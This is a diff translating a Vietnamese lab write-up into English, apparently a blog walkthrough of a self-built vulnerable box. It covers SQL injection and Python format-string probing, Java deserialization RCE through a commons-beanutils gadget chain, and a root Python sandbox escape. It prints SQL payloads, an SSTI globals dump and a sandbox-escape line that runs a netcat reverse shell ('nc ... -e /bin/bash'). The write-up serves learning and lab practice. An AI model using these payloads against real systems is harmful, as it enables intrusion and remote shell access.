@@ -12,36 +12,36 @@ tags: [
 ---
 
 ### Overview
-Địa chỉ: 10.14.140.127\
-Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và  phát triển bản thân.
-- 1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom
-- 2 – Từ datmom escape python sandbox để leo thang lên root.
+Address: 10.14.140.127\
+This Lab was created for myself and everyone in my teamtontac to research and learn about security vulnerabilities and develop ourselves.
+- 1 – Exploit the Java Deserialization vulnerability on port 8081 to get the datmom shell
+- 2 – From datmom, escape the python sandbox to escalate to root.
 
-Ngoài ra còn 1 số dịch vụ khác đóng vai trò làm rabbit hole (SQLInjection, SSTI).
+There are also some other services that act as rabbit holes (SQLInjection, SSTI).
 ### Rabbit hole
-Sử dụng nmap scan nhanh ta thấy được các port dịch vụ đang open trên máy chủ:
+Using a quick nmap scan we can see the service ports open on the server:
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/1.jpg)
 
 **Port 80**
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/2.jpg)
 
-Một ứng dụng web đang chạy trên port 80 cho phép chúng ta tìm kiếm thông tin nhân viên của CMC Infosec dựa vào user id do người dùng nhập vào:
+A web application running on port 80 lets us search for CMC Infosec employee information based on a user id entered by the user:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/3.jpg)
 
-Ta dễ dang detect được trang web bị ảnh hưởng bởi lỗ hổng SQL Injection chỉ với việc chèn thêm dấu nháy (') để phá vỡ câu truy vấn SQL:
+We can easily detect that the website is affected by a SQL Injection vulnerability just by inserting a quote (') to break the SQL query:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/4.jpg)
 
-Vì đây là chức năng tìm kiếm thông tin user dựa vào user id người dùng nhập vào. Nên ta có thể suy luận câu truy vấn SQL có thể như sau: \
+Since this is a function that searches for user information based on the user id entered by the user. We can infer the SQL query might be as follows: \
 ```SELECT id, full_name FROM users WHERE id LIKE '$id'```
 
-Tiến hành dump all user ( ```' or 1=1 -- -``` ):
+Proceed to dump all users ( ```' or 1=1 -- -``` ):
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/5.jpg)
 
-Sử dụng Sqlmap để dump all DB:
+Using Sqlmap to dump all DBs:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/6.jpg)
 
@@ -53,13 +53,13 @@ Dump DB secret:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/8.jpg)
 
-Không có nội dung đặc biệt và có thể lợi dụng được từ DB
+There's nothing special or exploitable in the DB
 
-Trích xuất version hệ quản trị CSDL: ```1' union select null,@@version -- -```
+Extract the DBMS version: ```1' union select null,@@version -- -```
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/9.jpg)
 
-Không thể sử dụng union kết hợp into outfile để get shell vì webroot đã được custom và user cũng không có quyền ghi vào thư mục webroot.
+We can't use union combined with into outfile to get a shell because the webroot has been customized and the user also doesn't have write permission to the webroot directory.
 
 **Port 9090**
 
@@ -67,119 +67,119 @@ Không thể sử dụng union kết hợp into outfile để get shell vì webr
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/11.jpg)
 
-Check source code ta biết được dịch vụ đang chạy trên port này là cockpit.
+Checking the source code we learn that the service running on this port is cockpit.
 
 https://github.com/cockpit-project/cockpit 
 
-Chỉ là 1 GUI management giúp quản lý OS -> Không có khả năng khai thác
+It's just a management GUI for managing the OS -> no exploitation potential
 
 **Port 9988**
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/12.jpg)
 
-Đây là 1 service tự custom là CMC memcat. Source code được cung cấp trước có sẵn tại:
+This is a custom service called CMC memcat. The source code provided beforehand is available at:
 
 http://10.14.140.127/memcat_server.py
 
-Ta thấy service hoạt động như một STACK cho phép PUSH, POP và DELETE data.
+We see the service works like a STACK that allows PUSH, POP and DELETE of data.
 
-Hiển thị dữ liệu cho người dùng sử dụng **.format** (là một template có sẵn của Python)
+It displays data to the user using **.format** (a built-in Python template)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/13.jpg)
 
-Vì vậy ở đây có thể bị ảnh hưởng bởi lỗ hổng SSTI (Server Side Template Injection). Có thể khai thác khi chúng ta kiểm soát được khung của đầu ra dữ liệu.
+So this could be affected by an SSTI (Server Side Template Injection) vulnerability. It can be exploited when we control the frame of the data output.
 
-Ta thấy ở đây hầu hết các output đều được fix cứng và không thể khai thác:
+We see that here most of the output is hard-coded and can't be exploited:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/14.jpg)
 
-Xem kĩ tính năng DELETE với len(parsed_data) là 3 ta thấy:
+Looking carefully at the DELETE feature with len(parsed_data) equal to 3 we see:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/15.jpg)
 
-Ở đây ta có thể kiểm soát được ```{val.value}``` là giá trị ta PUSH vào từ trước. Khi len(parsed_data) là 3 service sẽ in ra giá trị đó cho biết chi tiết của key cần delete:
+Here we can control ```{val.value}``` which is the value we PUSHed in earlier. When len(parsed_data) is 3 the service will print that value to show the details of the key to delete:
 
-Payload: ```{val.__init__.__globals__}``` (show ra toàn bộ biến global)
+Payload: ```{val.__init__.__globals__}``` (shows all the global variables)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/16.jpg)
 
-Chúng ta có hint: "Thank for your efforts!\nPort 8081 is the only way!\n"
+We have a hint: "Thank for your efforts!\nPort 8081 is the only way!\n"
 
-Thực tế chúng ta cũng không thể khai thác để chạy một lệnh tuỳ ý trên server vì .format trong python không cho phép gọi đến hàm, function khác. 
+In reality we also can't exploit it to run an arbitrary command on the server because .format in python doesn't allow calling other functions. 
 
 ### Foothold with Java deserialization
 #### Recon
-Khi truy cập vào máy chủ trên port 8081. Mặc định server cho ta download 1 file:
+When accessing the server on port 8081. By default the server lets us download a file:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/17.jpg)
 
-Với nội dung:
+With the content:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/18.jpg)
 
-Dựa vào header Content-Disposition ta có thể thấy được tên file là đường dẫn file: ```logs/info/info.2021-08-22.log```
+From the Content-Disposition header we can see that the file name is the file path: ```logs/info/info.2021-08-22.log```
 
-Server trả về lỗi logname:
+The server returns a logname error:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/19.jpg)
 
-Lúc này ta có thể thử thay đổi logname:
+At this point we can try changing the logname:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/20.jpg)
 
-Việc đổi logname vẫn trả về lỗi, nhưng có thể thấy rằng tên file đã thay đổi thực sự là tên file log, vì vậy nó có thể được chia theo ngày -> ta thay thế thành năm, tháng và ngày hôm nay.
+Changing the logname still returns an error, but we can see that the changed file name really is the log file name, so it may be split by date -> we replace it with this year, month and today's day.
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/21.jpg)
 
-Ta thấy file log được đọc thành công .Theo nội dung của file, có thể thấy rằng web sử dụng springboot, và tên gói jar tương ứng là **cb-0.0.1- SNAPSHOT.jar**
+We see the log file is read successfully. From the file's content, we can see that the web uses springboot, and the corresponding jar package name is **cb-0.0.1- SNAPSHOT.jar**
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/22.jpg)
 
-Thử tải xuống jar file:
+Try downloading the jar file:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/23.jpg)
 
-Thành công tải về jar file -> Decompile để xem source
+Successfully downloaded the jar file -> Decompile to view the source
 
-Ở đây sử dụng JadX
+Here using JadX
 
-Xử lý chính:
+Main handler:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/24.jpg)
 
-Ở đây ta tìm thấy được 1 API ẩn cho phép deserialize User từ request do người dùng gửi lên được mã hoá base64 sử dụng hàm **readObject()**
+Here we find a hidden API that allows deserializing a User from a user-submitted request encoded in base64 using the **readObject()** function
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/25.jpg)
 
 API endpoint:  **/bZdWASYu4nN3obRiLpqKCeS8erTZrdxx/parseUser**
 
-Điều này cho phép chúng ta tận dụng để có thể khai khác lỗ hổng Java Deserialization
+This lets us take advantage of it to exploit the Java Deserialization vulnerability
 #### Exploit
-File **pom.xml** là nơi khai báo tất cả những gì liên quan đến dự án được cấu hình qua maven, như khai báo các dependency, version của dự án, tên dự án, repossitory … 
+The **pom.xml** file is where everything related to the project configured through maven is declared, such as declaring the dependencies, the project version, the project name, the repository … 
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/26.jpg)
 
-Từ pom.xml ta biết được project sử dụng thư viện **commons-beanutils 1.8.2**
+From pom.xml we learn the project uses the **commons-beanutils 1.8.2** library
 
-Đây là 1  thư viện chứa một gadget chain có thể dẫn tới thực thi mã tuỳ ý trên máy chủ thông qua lỗ hổng Java Deserialization đã được phát hiện từ trước.
+This is a library containing a gadget chain that can lead to arbitrary code execution on the server through the previously discovered Java Deserialization vulnerability.
 
-Ysoserial là bột cộ công cụ nổi tiếng cho phép chúng ta gen payload Java Deserialization một cách tự động.
+Ysoserial is a famous set of tools that lets us generate Java Deserialization payloads automatically.
 
 https://github.com/frohoff/ysoserial 
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/27.jpg)
 
-Ở đây Ysoserial bao gồm cả payload liên quan đến thư viện commons-beanutils. Nhưng khi xem kĩ hơn phần code được sử dụng để gen payload cho thư viện này của ysoserial ta thấy: 
+Here Ysoserial includes a payload related to the commons-beanutils library. But looking more closely at the code ysoserial uses to generate the payload for this library, we see: 
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/28.jpg)
 
-Ngoài việc sử dụng commons-beanutils, payload ysoserial tạo ra cũng cần **commons-collections** và **commons-logging** để có thể hoàn thiện chain. Mà trong dự án lại không có thêm 2 gói phụ thuộc này.
+Besides using commons-beanutils, the payload ysoserial creates also needs **commons-collections** and **commons-logging** to complete the chain. But the project doesn't have these 2 additional dependencies.
 
-Vậy chúng ta không thể sử dụng công cụ này để tạo payload giúp RCE máy chủ. Chúng ta chỉ có thể tự viết code gen payload chỉ bao gồm commons-beanutils và các thư viện chuẩn của java để tạo payload giúp RCE máy chủ.
+So we can't use this tool to create a payload for RCE on the server. We can only write our own payload-generation code using only commons-beanutils and java's standard libraries to create a payload for RCE on the server.
 
-Như đã được phân tích kĩ trong bài viết : https://tranquac.com/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/ 
+As analyzed in detail in the post : https://tranquac.com/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/ 
 
-Gadget chain có trong thư viện này sẽ như sau: 
+The gadget chain in this library is as follows: 
 
 ```java
 ObjectInputStream.readObject()
@@ -197,27 +197,27 @@ ObjectInputStream.readObject()
                                                 Runtime.exec()
 ```
 
-Như đã được phân tích trong bài viết: 
+As analyzed in the post: 
 
-PropertyUtils.getProperty(o1, property) : Khi o1 được truyền vào là một TemplatesImpl object và property có giá trị là outputProperties, phương thức getter sẽ tự động gọi để thực thi phương thức TemplatesImpl#getOutputProperties(). Trong nội bộ TemplatesImpl#getOutputProperties() nó lại gọi đến newTransformer(). Mà TemplatesImpl#newTransformer() thường được sử dụng để thực thi bytecodes độc hại. Nhiệm vụ của chúng ta là tạo bytecode độc hại mà giúp RCE máy chủ để truyền vào đối tượng  TemplatesImpl giúp hoàn thành chain
+PropertyUtils.getProperty(o1, property) : when o1 passed in is a TemplatesImpl object and property has the value outputProperties, the getter method will be called automatically to execute the TemplatesImpl#getOutputProperties() method. Internally, TemplatesImpl#getOutputProperties() in turn calls newTransformer(). And TemplatesImpl#newTransformer() is commonly used to execute malicious bytecodes. Our task is to create malicious bytecode that gives RCE on the server to pass into the TemplatesImpl object to complete the chain
 
-Tạo một đối tượng TemplatesImpl thực thi bytecode độc hại: 
+Create a TemplatesImpl object that executes the malicious bytecode: 
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/29.jpg)
 
-TargetByteCodes chính là bytecode độc hại được tạo ra bằng cách:
+TargetByteCodes is exactly the malicious bytecode created by:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/30.jpg)
 
-Tạo ra một class từ String command truyền vào -> biến đổi class đó thành mảng byte tương ứng kiểu để truyền vào TemplatesImpl
+Create a class from the String command passed in -> convert that class into the corresponding byte array type to pass into TemplatesImpl
 
-Rồi gọi đến hàm getPayload để tạo payload -> Encode base64 để truyền lên server
+Then call the getPayload function to create the payload -> Encode it in base64 to send to the server
 
-Thay thế + thành “%2b” để tránh lỗi kí tự khi xử lý trên server:
+Replace + with “%2b” to avoid character errors when processed on the server:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/31.jpg)
 
-Sau khi chạy nhận được payload:
+After running we get the payload:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/32.jpg)
 
@@ -225,68 +225,68 @@ Sau khi chạy nhận được payload:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/33.jpg)
 
-Ngoài ra ta cũng có thể sử dụng một cách khác. Vì ứng dụng sử dụng spring boot. Nên ta sẽ tạo class **SpringEcho** có tác dụng nhận một **Header cmd** mỗi request. Thực thi **cmd** đó và trả lại response. Như vậy mỗi lần thực thi một lệnh khác nhau ta sẽ không cần phải gen lại payload nữa:
+We can also use another approach. Since the application uses spring boot. We'll create a **SpringEcho** class whose job is to receive a **cmd Header** on each request. Execute that **cmd** and return the response. This way each time we run a different command we won't need to regenerate the payload:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/34.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/35.jpg)
 
-Tham khảo:
+References:
 
 https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md
 
 https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java 
 
-Thảo khảo toàn bộ source tại: http://103.81.86.132/source.rar 
+Full source for reference at: http://103.81.86.132/source.rar 
 
 ### Datmom to root with Python escape sandbox
-Sau khi lấy được shell của user datmom. Sử dụng sudo -l ta thấy user datmom có thể chạy 2 command với đặc quyền của root 
+After getting the datmom user's shell. Using sudo -l we see the datmom user can run 2 commands with root privileges 
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/36.jpg)
 
-Command đầu tiên không thể được lợi dụng để leo thang đặc quyền
+The first command can't be abused for privilege escalation
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/37.jpg)
 
-Vì để lấy được shell phải chờ một khoảng thời gian rất lâu, cũng không có input hay untrusted data nào có thể lợi dụng được
+Because getting a shell requires waiting a very long time, and there's no input or untrusted data that can be abused
 
-Lệnh thứ 2 cho phép ta mở một sandbox python dưới đặc quyền của root
+The 2nd command lets us open a python sandbox under root privileges
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/38.jpg)
 
-Mục tiêu là từ sandbox làm sao ta có thể thực thi được os command lấy được shell root.
+The goal is, from the sandbox, how can we execute an os command to get a root shell.
 
-Nội dung es2.py
+The content of es2.py
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/39.jpg)
 
-Ở đây. Sandbox đã được xoá hết func, lib mà ta có thể lợi dụng để gọi OS command: import, exec, eval, os …
+Here. The sandbox has removed all the funcs and libs we could abuse to call OS commands: import, exec, eval, os …
 
-Nếu lệnh của chúng ta không chứa những từ khoá này thì sẽ được thực thi. Còn không thì sẽ đưa ra cảnh báo:
+If our command doesn't contain these keywords it will be executed. Otherwise it gives a warning:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/40.jpg)
 
-Vì vậy làm sao để có thể thực thi được os command từ sandbox này?
+So how can we execute an os command from this sandbox?
 
-Khi chúng ta không  thể import modules hay những modules mà chúng ta muốn import bị cấm. 
+When we can't import modules, or the modules we want to import are forbidden. 
 
-Ý tưởng tương tự khi chúng ta khai thác lỗ hổng SSTI. Được biết mỗi đối tượng trong python đều có các properties, method ẩn. Liệu từ những properties hay method ẩn này chúng ta có thể làm một điều gì đó lớn lao?
+A similar idea to when we exploit the SSTI vulnerability. It's known that every object in python has hidden properties and methods. Can we, from these hidden properties or methods, do something big?
 
-Ví dụ một payload giúp escape sandbox này:
+For example, a payload to escape this sandbox:
 
 ```print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('nc 127.0.0.1 4444 -e /bin/bash'))```
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/41.jpg)
 
-Chúng ta hãy cùng đi sâu 1 chút để hiểu hơn về payload này hoạt động ra sao:
+Let's dig a bit deeper to better understand how this payload works:
 
-Khi làm SSTI tôi thường quan tâm đến method __init__ khi nó xuất hiên, là một method thú vị, từ nó chúng ta hay có thể làm được 1 điều gì đó thú vị như: in ra toàn bộ biến globals, RCE …
+When doing SSTI I usually pay attention to the __init__ method when it appears, it's an interesting method, and from it we can often do something interesting such as: printing all the globals variables, RCE …
 
-() được biết đến như cách khai báo một tuple trong python
+() is known as the way to declare a tuple in python
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/42.jpg)
 
-Sử dụng dir để xem toàn bộ properties hay method ẩn của 1 tuple
+Using dir to view all the hidden properties or methods of a tuple
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/43.jpg)
 
@@ -294,21 +294,21 @@ Sử dụng dir để xem toàn bộ properties hay method ẩn của 1 tuple
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/44.jpg)
 
-Kiên trì tìm kiếm bằng cách sử dụng dump hay tìm kiếm 1 payload mà đã được tìm ra trước đó. Ta có thể thấy ```__init__``` xuất hiện tại:
+Persistently searching by using dump or looking for a payload that was found before. We can see ```__init__``` appears at:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/45.jpg)
 
-Tiếp tục đi sâu vào ```__init__``` ta sẽ tìm thấy một con đường giúp chúng ta gọi đến được os lib bằng cách sử dụng ```func_globals['linecache']``` có trong ```__init__```
+Continuing deeper into ```__init__``` we'll find a path that lets us reach the os lib by using ```func_globals['linecache']``` found in ```__init__```
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/46.jpg)
 
-YES. Nhưng để tránh keyword **os** đã bị cấm. Ta sẽ gọi đến nó bằng cách cộng 2 chuối “o” và “s”. Trong os gọi tiếp đến “system” và giờ có thể run os command tuỳ ý.
+YES. But to avoid the **os** keyword which is forbidden. We'll call it by concatenating the 2 strings “o” and “s”. In os we then call “system” and now we can run arbitrary os commands.
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/47.jpg)
 
-Có rất nhiều payload khác cũng có thể giúp ta đạt được mục tiêu cuối cùng. Mọi người có thể tìm hiểu thêm và phân tích để hiểu rõ hơn.
+There are many other payloads that can also help us reach the final goal. You can research and analyze more to understand it better.
 
-Cảm ơn vì đã đọc tới đây!
+Thanks for reading this far!
 
 
 
